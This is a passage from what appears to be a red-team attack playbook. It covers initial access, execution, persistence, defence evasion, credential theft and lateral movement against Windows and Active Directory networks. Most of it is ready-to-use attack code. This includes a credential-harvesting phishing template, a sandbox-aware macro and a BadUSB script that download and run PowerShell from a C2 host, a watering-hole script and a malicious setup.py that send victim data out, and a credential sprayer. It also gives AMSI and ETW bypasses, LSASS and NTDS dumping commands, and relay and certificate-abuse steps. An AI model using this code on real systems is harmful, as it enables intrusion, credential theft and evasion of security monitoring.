        <h2 style="color: #333;">Finance Portal Security Update</h2>
        <p>Dear {{.FirstName}},</p>
        <p>As part of our ongoing security improvements, we are requiring all 
           Finance department employees to re-verify their credentials on the 
           updated portal by <strong>March 18, 2024</strong>.</p>
        <p>This is necessary to maintain access to the quarterly reporting 
           system ahead of the Q1 deadline.</p>
        <div style="text-align: center; margin: 30px 0;">
            <a href="{{.URL}}" 
               style="background: #0078d4; color: white; padding: 14px 28px; 
                      text-decoration: none; border-radius: 4px; font-weight: bold;">
                Verify Access Now
            </a>
        </div>
        <p style="color: #666; font-size: 12px;">
            If you did not request this or believe this is in error, please 
            contact the IT Help Desk at ext. 4200.
        </p>
    </div>
    <div style="padding: 15px; text-align: center; color: #999; font-size: 11px;">
        <p>This message was sent by IT Security | Do not forward</p>
        <img src="{{.TrackingURL}}" width="1" height="1" alt="">
    </div>
</body>
</html>
```

**Payload delivery via macro-enabled document:**

```vba
' Document_Open macro — stages payload download
' Obfuscated to bypass static analysis
Private Sub Document_Open()
    Dim wsh As Object
    Dim cmd As String
    
    ' Only execute if not in sandbox (check for common sandbox artifacts)
    If Dir("C:\agent\agent.exe") <> "" Then Exit Sub
    If Environ("USERNAME") = "sandbox" Then Exit Sub
    If Environ("COMPUTERNAME") Like "DESKTOP-*" Then
        ' Build download command
        cmd = "powershell -nop -w hidden -ep bypass -c " & _
              """IEX((New-Object Net.WebClient).DownloadString(" & _
              "'https://cdn-static.legitimatedomain.com/update.ps1'))"""
        
        Set wsh = CreateObject("WScript.Shell")
        wsh.Run cmd, 0, False
    End If
End Sub
```

### 4.2 Drive-By Compromise — Watering Hole and Browser Exploits

Watering hole attacks compromise websites that the target organization's employees regularly visit.

**Reconnaissance for watering hole:**
- Identify industry forums, professional associations, vendor portals
- Analyze target organization's web traffic patterns (from OSINT, LinkedIn activity)
- Look for vulnerable sites in the target's browsing ecosystem

**Watering hole injection example (JavaScript profiling and redirect):**

```javascript
// Injected into compromised third-party site
// Profiles visitors and selectively serves exploit/payload
(function() {
    var targetDomains = ['target-corp.com', 'target-subsidiary.com'];
    var c2 = 'https://cdn-static.legitimatedomain.com';
    
    // Check if visitor's email domain matches targets
    function checkTarget() {
        // Attempt to identify target via referrer, cookies, or timing
        var referrer = document.referrer.toLowerCase();
        for (var i = 0; i < targetDomains.length; i++) {
            if (referrer.indexOf(targetDomains[i]) !== -1) {
                return true;
            }
        }
        
        // Browser fingerprinting for additional targeting
        var fp = navigator.userAgent + screen.width + screen.height + 
                 navigator.language + new Date().getTimezoneOffset();
        
        // Send fingerprint to C2 for server-side target validation
        var img = new Image();
        img.src = c2 + '/pixel.gif?fp=' + btoa(fp) + '&r=' + btoa(referrer);
        return false; // Server-side decides on next visit
    }
    
    if (checkTarget()) {
        // Serve exploit or social engineering payload
        var iframe = document.createElement('iframe');
        iframe.src = c2 + '/update-required.html';
        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;' +
                               'height:100%;z-index:99999;border:none;';
        document.body.appendChild(iframe);
    }
})();
```

### 4.3 Supply Chain Attacks

Supply chain attacks target the trust relationship between the target and their software providers.

**Dependency confusion (targeting internal package names):**

```python
# setup.py for malicious package uploaded to public PyPI
# Package name matches internal company package discovered via OSINT
# (GitHub leaks, error messages, job postings mentioning internal tools)

from setuptools import setup
import os
import socket
import base64

def exfil():
    """Send environment info to C2 during package install."""
    info = {
        'hostname': socket.gethostname(),
        'user': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
        'cwd': os.getcwd(),
        'path': os.environ.get('PATH', ''),
        'pip_config': '',
    }
    
    pip_conf_paths = [
        os.path.expanduser('~/.pip/pip.conf'),
        os.path.expanduser('~/pip/pip.ini'),
        '/etc/pip.conf'
    ]
    for p in pip_conf_paths:
        if os.path.exists(p):
            with open(p, 'r') as f:
                info['pip_config'] = f.read()
            break
    
    # DNS exfiltration of basic info
    encoded = base64.b32encode(
        f"{info['hostname']}|{info['user']}|{info['cwd']}".encode()
    ).decode().rstrip('=')
    
    # Split into DNS-safe labels (63 char max per label)
    labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    query = '.'.join(labels) + '.exfil.attacker-domain.com'
    
    try:
        socket.getaddrinfo(query, None)
    except Exception:
        pass

exfil()

setup(
    name='target-internal-utils',  # Matches internal package name
    version='99.0.0',              # Higher version wins in dependency resolution
    description='Internal utilities',
    packages=['target_internal_utils'],
    # install_requires triggers during pip install
)
```

### 4.4 External Service Exploitation

Targeting internet-facing services for direct compromise:

- **VPN appliances**: Pulse Secure (CVE-2021-22893), Fortinet (CVE-2023-27997), Citrix (CVE-2023-4966 "Citrix Bleed")
- **RDP**: BlueKeep (CVE-2019-0708), NLA bypass, credential spraying
- **Web applications**: Custom app vulnerabilities, CMS exploits, deserialization flaws
- **Mail servers**: Exchange ProxyShell/ProxyLogon, Zimbra CVEs

### 4.5 Valid Accounts — Credential Attacks

```python
#!/usr/bin/env python3
"""
Credential spraying tool with OPSEC considerations.
Targets Office 365 / Azure AD with timing controls.
"""
import requests
import time
import random
import json
from datetime import datetime, timezone

class CredentialSprayer:
    def __init__(self, target_domain: str, userlist_path: str):
        self.target = target_domain
        self.users = self._load_users(userlist_path)
        self.results = []
        self.lockout_threshold = 3  # Spray fewer than lockout policy
        self.spray_delay = 1800     # 30 minutes between spray rounds
        self.user_delay = (1, 3)    # 1-3 seconds between users
        
        # Azure AD OAuth endpoint
        self.url = "https://login.microsoftonline.com/common/oauth2/token"
    
    def _load_users(self, path: str) -> list:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def spray(self, password: str) -> list:
        """Spray single password across all users with timing controls."""
        hits = []
        timestamp = datetime.now(timezone.utc).isoformat()
        print(f"[{timestamp}] Spraying password: {password} against {len(self.users)} users")
        
        random.shuffle(self.users)  # Randomize order each round
        
        for user in self.users:
            email = f"{user}@{self.target}"
            
            data = {
                "resource": "https://graph.microsoft.com",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "openid"
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json"
            }
            
            try:
                resp = requests.post(self.url, data=data, headers=headers, timeout=10)
                result = resp.json()
                
                if "access_token" in result:
                    print(f"  [+] VALID: {email}:{password}")
                    hits.append({"user": email, "password": password, "time": timestamp})
                elif "AADSTS50053" in result.get("error_description", ""):
                    print(f"  [!] LOCKED: {email} — stopping spray for this user")
                elif "AADSTS50126" in result.get("error_description", ""):
                    pass  # Invalid password, expected
                elif "AADSTS50055" in result.get("error_description", ""):
                    print(f"  [*] EXPIRED: {email}:{password} — password expired but valid")
                    hits.append({"user": email, "password": password, "note": "expired"})
                elif "AADSTS50076" in result.get("error_description", ""):
                    print(f"  [*] MFA REQUIRED: {email}:{password} — valid creds, MFA blocks")
                    hits.append({"user": email, "password": password, "note": "mfa"})
                    
            except requests.exceptions.RequestException as e:
                print(f"  [!] ERROR: {email} — {e}")
            
            # Random delay between attempts
            time.sleep(random.uniform(*self.user_delay))
        
        self.results.extend(hits)
        return hits
    
    def campaign(self, passwords: list):
        """Execute full spray campaign with inter-round delays."""
        for i, password in enumerate(passwords):
            self.spray(password)
            
            if i < len(passwords) - 1:
                delay = self.spray_delay + random.randint(-300, 300)
                print(f"  [*] Waiting {delay}s before next password...")
                time.sleep(delay)
        
        return self.results


if __name__ == "__main__":
    sprayer = CredentialSprayer(
        target_domain="target-corp.com",
        userlist_path="users.txt"
    )
    
    # Common password patterns (season + year, company + year, etc.)
    passwords = [
        "Spring2024!",
        "Target2024!",
        "Welcome1!",
        "Password123!",
        "Summer2024#"
    ]
    
    results = sprayer.campaign(passwords)
    
    with open("spray_results.json", "w") as f:
        json.dump(results, f, indent=2)
```

### 4.6 Hardware Attacks — USB Drop and BadUSB

USB drop campaigns exploit human curiosity. Labeled drives ("Salary_2024_Q1", "Layoff_List") are placed in target parking lots, lobbies, and break rooms.

**BadUSB payload (Rubber Ducky / Digispark):**

```
REM BadUSB Script - DuckyScript
REM Executes PowerShell download cradle
REM Delay for OS to recognize USB HID

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "IEX(IWR 'https://cdn-static.legitimatedomain.com/u.ps1' -UseBasicParsing)"
DELAY 100
ENTER
```

### 4.7 Trusted Relationship Abuse

Exploiting managed service providers (MSPs), vendor VPN access, or supply chain trust:

- Compromise an MSP's management tools (RMM agents like ConnectWise, Kaseya)
- Leverage shared Active Directory trusts between parent/subsidiary companies
- Abuse OAuth application consent grants in cloud environments
- Target vendor-specific portals with access to internal systems

---

## 5. Execution and Persistence

### 5.1 Execution Techniques

#### PowerShell (T1059.001)

```powershell
# AMSI-aware PowerShell execution
# Download and execute in memory without touching disk
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$wc.Headers.Add("Cookie", "session=VALID_AUTH_TOKEN")
$payload = $wc.DownloadString("https://cdn-static.legitimatedomain.com/jquery.min.js")
# Payload is disguised as jQuery but contains encoded PowerShell
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload.Split('/*')[1].Split('*/')[0]))
IEX $decoded
```

#### WMI Execution (T1047)

```powershell
# Remote execution via WMI (requires admin credentials on target)
$cred = New-Object System.Management.Automation.PSCredential(
    "DOMAIN\admin_user",
    (ConvertTo-SecureString "Password123" -AsPlainText -Force)
)

Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "powershell -nop -w hidden -enc BASE64_PAYLOAD" `
    -ComputerName TARGET-WS01 `
    -Credential $cred
```

#### Scheduled Task Creation (T1053.005)

```powershell
# Create scheduled task for execution (also doubles as persistence)
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\rundll32.exe" `
    -Argument "C:\ProgramData\Microsoft\Crypto\update.dll,DllMain"

$trigger = New-ScheduledTaskTrigger -AtLogOn

$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 0)

Register-ScheduledTask -TaskName "Microsoft\Windows\Maintenance\CacheTask" `
    -Action $action -Trigger $trigger -Settings $settings `
    -RunLevel Highest -Force
```

#### Service Creation (T1543.003)

```powershell
# Install as Windows service using sc.exe
sc.exe create "Windows Update Assistant" binpath= "C:\ProgramData\update.exe" `
    start= auto obj= LocalSystem DisplayName= "Windows Update Assistant Service"
sc.exe description "Windows Update Assistant" "Provides Windows Update functionality"
sc.exe start "Windows Update Assistant"
```

### 5.2 Persistence Mechanisms

#### Registry Run Keys (T1547.001)

```powershell
# HKCU Run key (user-level, no admin required)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$payload = "rundll32.exe C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\update.dll,Start"
Set-ItemProperty -Path $regPath -Name "OneDriveSync" -Value $payload -Force

# HKLM Run key (machine-level, requires admin)
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SecurityHealthService" -Value $payload -Force
```

#### WMI Event Subscriptions (T1546.003)

```powershell
# WMI persistence - triggers on user login
$filterName = "WindowsUpdateFilter"
$consumerName = "WindowsUpdateConsumer"

# Event filter - triggers every time a user logs in
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" `
    -Arguments @{
        Name = $filterName;
        EventNamespace = "root\cimv2";
        QueryLanguage = "WQL";
        Query = $filterQuery
    }

# Event consumer - executes payload
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" `
    -Arguments @{
        Name = $consumerName;
        CommandLineTemplate = "powershell -nop -w hidden -ep bypass -f C:\ProgramData\Microsoft\sync.ps1"
    }

# Binding filter to consumer
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" `
    -Arguments @{
        Filter = $filter;
        Consumer = $consumer
    }
```

#### DLL Hijacking (T1574.001)

```c
// Custom DLL that proxies legitimate calls while executing payload
// Targets commonly hijackable DLL paths (e.g., version.dll in application directories)

#include <windows.h>
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW")

void ExecutePayload() {
    // Download and execute shellcode in memory
    // Implementation uses direct syscalls to avoid EDR hooks
    HANDLE hThread = NULL;
    // ... shellcode execution logic ...
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecutePayload, NULL, 0, NULL);
            break;
    }
    return TRUE;
}
```

#### COM Object Hijacking (T1546.015)

```powershell
# Hijack a COM object that's loaded by a legitimate scheduled task
# Target: CLSID for "Task Scheduler" UI handler (example)
$clsid = "{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"
$maliciousDll = "C:\ProgramData\Microsoft\Windows\update.dll"

# Create registry entries for COM hijack
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value $maliciousDll
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
```

### 5.3 Defense Evasion

#### AMSI Bypass (T1562.001)

```powershell
# AMSI bypass via memory patching (AmsiScanBuffer)
# Note: Specific bypass techniques rotate as vendors patch them
$a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b = $a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

```csharp
// C# AMSI bypass via hardware breakpoint (more evasive)
// Sets hardware breakpoint on AmsiScanBuffer to force return clean result
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();
    
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT context);
    
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT context);
    
    // ... CONTEXT structure and implementation ...
    // Sets DR0 to AmsiScanBuffer address with break-on-execute
    // Exception handler returns AMSI_RESULT_CLEAN
}
```

#### ETW Patching (T1562.006)

```csharp
// Patch EtwEventWrite to prevent telemetry generation
// Used to blind EDR solutions that rely on ETW for process telemetry
using System;
using System.Runtime.InteropServices;

public class EtwPatch
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
    
    public static void Patch()
    {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        
        // x64: xor rax, rax; ret (return 0 = STATUS_SUCCESS)
        byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 };
        
        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, etwAddr, patch.Length);
        VirtualProtect(etwAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
```

#### Direct Syscalls (T1106)

```c
// Direct syscall stub - bypasses ntdll hooks placed by EDR
// Retrieves syscall numbers dynamically from ntdll on disk

#include <windows.h>

// Syscall stub for NtAllocateVirtualMemory
__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    __asm {
        mov r10, rcx
        mov eax, 0x18       // Syscall number (varies by Windows version)
        syscall
        ret
    }
}

// Dynamic syscall number resolution from ntdll.dll on disk
DWORD GetSyscallNumber(const char* functionName) {
    // 1. Map ntdll.dll from disk (not the hooked in-memory copy)
    // 2. Parse PE export table
    // 3. Find function, read syscall number from stub
    // This avoids reading from the hooked ntdll in process memory
    
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    // ... PE parsing logic to extract syscall number ...
    return syscallNumber;
}
```

#### Process Hollowing (T1055.012)

```csharp
// Process hollowing: create suspended process, replace its memory with payload
// Legitimate process (svchost.exe) runs with malicious code
using System;
using System.Runtime.InteropServices;

public class ProcessHollowing
{
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    
    const uint CREATE_SUSPENDED = 0x00000004;
    
    public static void Hollow(byte[] payload)
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        
        // Create legitimate process in suspended state
        CreateProcess(null, "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
            IntPtr.Zero, null, ref si, out pi);
        
        // Unmap original image
        // Allocate new memory at preferred base
        // Write payload PE sections
        // Fix relocations if needed
        // Set new entry point in thread context
        // Resume thread
        
        ResumeThread(pi.hThread);
    }
}
```

### 5.4 Credential Access

#### LSASS Memory Dumping (T1003.001)

```powershell
# Method 1: comsvcs.dll MiniDump (lives off the land)
# Requires SeDebugPrivilege (admin context)
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\debug.dmp full

# Method 2: ProcDump from Sysinternals (signed by Microsoft)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\debug.dmp

# Method 3: Silent Process Exit (triggers dump via Windows Error Reporting)
# Configure WER to dump LSASS on process termination
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\Windows\Temp"
```

#### Kerberoasting (T1558.003)

```powershell
# Kerberoasting: request TGS tickets for service accounts, crack offline
# Uses Rubeus (C# Kerberos abuse toolkit)

# Request TGS for all kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt /format:hashcat

# Target specific high-value SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /format:hashcat

# PowerShell native approach (no tools dropped)
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach ($spn in $spns) {
    foreach ($s in $spn.ServicePrincipalName) {
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s
        $ticketBytes = $ticket.GetRequest()
        # Extract and format for hashcat
    }
}
```

#### DCSync (T1003.006)

```powershell
# DCSync: replicate credentials from domain controller
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# Typically Domain Admin, Enterprise Admin, or DC computer accounts

# Using Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Using Impacket (from Linux)
# secretsdump.py -just-dc corp.local/admin:Password123@dc01.corp.local
```

#### NTDS.dit Extraction (T1003.003)

```powershell
# Volume Shadow Copy method to extract NTDS.dit offline
# Requires Domain Admin on Domain Controller

# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit

# Also need SYSTEM registry hive for decryption
reg save HKLM\SYSTEM C:\Temp\system.hiv

# Alternatively: ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\IFM" quit quit

# Parse offline with Impacket
# secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```

---

## 6. Lateral Movement and Pivoting

### 6.1 Internal Reconnaissance

#### Active Directory Enumeration

```powershell
# PowerView - AD reconnaissance
Import-Module .\PowerView.ps1

# Enumerate domain trusts
Get-DomainTrust

# Find domain admins
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Find computers where current user has local admin
Find-LocalAdminAccess

# Enumerate Group Policy Objects
Get-DomainGPO | Select-Object DisplayName, GPCFileSysPath

# Find users with SPN (Kerberoastable)
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName

# Enumerate ACLs for privilege escalation paths
Find-InterestingDomainAcl -ResolveGUIDs

# Find shares accessible by current user
Find-DomainShare -CheckShareAccess
```

#### BloodHound — Attack Path Visualization

BloodHound maps Active Directory relationships to identify attack paths to high-value targets.

**Data collection (SharpHound):**

```powershell
# SharpHound collection methods
.\SharpHound.exe -c All --outputdirectory C:\Windows\Temp --nosavecache --randomfilenames --zipfilename data.zip

# Stealth collection (fewer queries, longer duration)
.\SharpHound.exe -c DCOnly --outputdirectory C:\Windows\Temp --nosavecache --stealth
```

**Critical BloodHound Cypher queries:**

```cypher
// Shortest path from owned user to Domain Admin
MATCH p=shortestPath((n:User {owned:true})-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// Find all Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN u.name, length(p)
ORDER BY length(p) ASC

// Users with DCSync rights
MATCH (n)-[:MemberOf|GetChanges*1..]->(d:Domain)
MATCH (n)-[:MemberOf|GetChangesAll*1..]->(d:Domain)
RETURN n.name, n.objectid

// Computers where Domain Users have local admin
MATCH (g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN c.name

// Find AS-REP roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description

// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name

// Users who can PSRemote to a computer
MATCH p=(u:User)-[:CanPSRemote]->(c:Computer)
RETURN u.name, c.name

// Group Policy abuse paths
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer)
MATCH (u:User)-[:GenericWrite|WriteDacl|WriteOwner|Owns]->(g)
RETURN u.name, g.name, c.name
```

#### Network Scanning (Internal)

```powershell
# Fast internal port scan without dropping tools (PowerShell native)
function Invoke-PortScan {
    param(
        [string]$Subnet,
        [int[]]$Ports = @(22,80,135,139,443,445,1433,3306,3389,5432,5985,8080,8443)
    )
    
    $results = @()
    $ips = 1..254 | ForEach-Object { "$Subnet.$_" }
    
    foreach ($ip in $ips) {
        foreach ($port in $Ports) {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $connection = $tcp.BeginConnect($ip, $port, $null, $null)
            $wait = $connection.AsyncWaitHandle.WaitOne(100, $false)
            
            if ($wait -and $tcp.Connected) {
                $results += [PSCustomObject]@{
                    IP = $ip; Port = $port; State = "Open"
                }
            }
            $tcp.Close()
        }
    }
    return $results
}

# Scan internal /24
Invoke-PortScan -Subnet "10.10.20" -Ports @(445,3389,5985,1433)
```

### 6.2 Movement Techniques

#### PsExec (T1569.002)

```powershell
# Impacket psexec (from Linux attack box)
# psexec.py corp.local/admin:'Password123'@10.10.20.50
# Drops a service binary, creates/starts service, connects via named pipe

# PowerShell alternative using SCM
$serviceName = "WinMgmtSvc"
$binaryPath = "cmd /c powershell -nop -w hidden -enc BASE64PAYLOAD"
sc.exe \\TARGET-WS01 create $serviceName binpath= $binaryPath start= demand
sc.exe \\TARGET-WS01 start $serviceName
sc.exe \\TARGET-WS01 delete $serviceName
```

#### WinRM / PowerShell Remoting (T1021.006)

```powershell
# WinRM lateral movement (port 5985/5986)
$cred = Get-Credential  # Or build PSCredential from harvested creds
$session = New-PSSession -ComputerName TARGET-WS01 -Credential $cred

# Execute commands
Invoke-Command -Session $session -ScriptBlock {
    whoami; hostname; ipconfig /all
}

# Load implant into remote session
Invoke-Command -Session $session -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString("https://cdn-static.legitimatedomain.com/update.ps1")
}

# Interactive session
Enter-PSSession -Session $session
```

#### DCOM Lateral Movement (T1021.003)

```powershell
# DCOM execution via MMC20.Application
$target = "TARGET-WS01"
$command = "powershell -nop -w hidden -enc BASE64PAYLOAD"

$dcom = [System.Activator]::CreateInstance(
    [Type]::GetTypeFromProgID("MMC20.Application", $target)
)
$dcom.Document.ActiveView.ExecuteShellCommand(
    "C:\Windows\System32\cmd.exe", $null, "/c $command", "7"
)
```

### 6.3 Pivoting

#### SOCKS Proxy via SSH

```bash
# Dynamic SOCKS proxy through compromised Linux host
ssh -D 1080 -N -f user@compromised-host.internal

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 10.10.20.0/24 -p 445,3389
```

#### Chisel — TCP/UDP Tunneling

```bash
# On attack machine (server mode)
./chisel server --reverse --port 8443 --socks5

# On compromised target (client mode)
.\chisel.exe client ATTACK_IP:8443 R:socks

# This creates a SOCKS5 proxy on attack machine port 1080
# All traffic through this proxy exits from the compromised target's network position
```

#### Ligolo-ng — Advanced Pivoting

```bash
# Operator machine: start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On compromised target: start agent
.\agent.exe -connect OPERATOR_IP:11601 -ignore-cert

# In ligolo-ng proxy console:
ligolo-ng » session
ligolo-ng » ifconfig                    # View target network interfaces
ligolo-ng » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444  # Port forward
ligolo-ng » start                       # Start tunnel

# Add route on operator machine for target internal network
sudo ip route add 10.10.20.0/24 dev ligolo
```

### 6.4 Domain Escalation

#### Kerberos Delegation Abuse

```powershell
# Unconstrained delegation abuse
# If a computer has unconstrained delegation, any TGT presented to it is cached
# Force a DC to authenticate (via PrinterBug/PetitPotam) and capture its TGT

# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Trigger authentication from DC using PetitPotam
python3 PetitPotam.py -d corp.local -u user -p 'Password123' UNCONSTRAINED_HOST DC01

# Monitor for incoming TGTs with Rubeus
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$

# Pass the captured TGT
.\Rubeus.exe ptt /ticket:BASE64_TGT
```

#### Active Directory Certificate Services (AD CS) Abuse

```bash
# ESC1: Enroll in template that allows arbitrary SAN
# Find vulnerable templates with Certipy
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.20.10 -vulnerable

# Request certificate with Domain Admin SAN
certipy req -u user@corp.local -p 'Password123' -dc-ip 10.10.20.10 \
    -ca CORP-CA -template VulnerableTemplate \
    -upn administrator@corp.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.20.10

# ESC8: NTLM relay to AD CS HTTP enrollment endpoint
# Coerce authentication from DC, relay to /certsrv/certfnsh.asp
ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# Trigger authentication
python3 PetitPotam.py RELAY_SERVER DC01.corp.local
```

#### Group Policy Exploitation

```powershell
# If user has write access to a GPO linked to target OU
# Add scheduled task via GPO for code execution

# Using SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Security Update" \
    --Author "NT AUTHORITY\SYSTEM" \
    --Command "cmd.exe" --Arguments "/c powershell -enc BASE64PAYLOAD" \
    --GPOName "Workstation Policy"

# Force GPO update on targets
Invoke-GPUpdate -Computer TARGET-WS01 -Force
```

### 6.5 Cloud Lateral Movement — On-Prem to Cloud Pivoting

```powershell
# Scenario: Compromised on-prem AD synced to Azure AD via Azure AD Connect
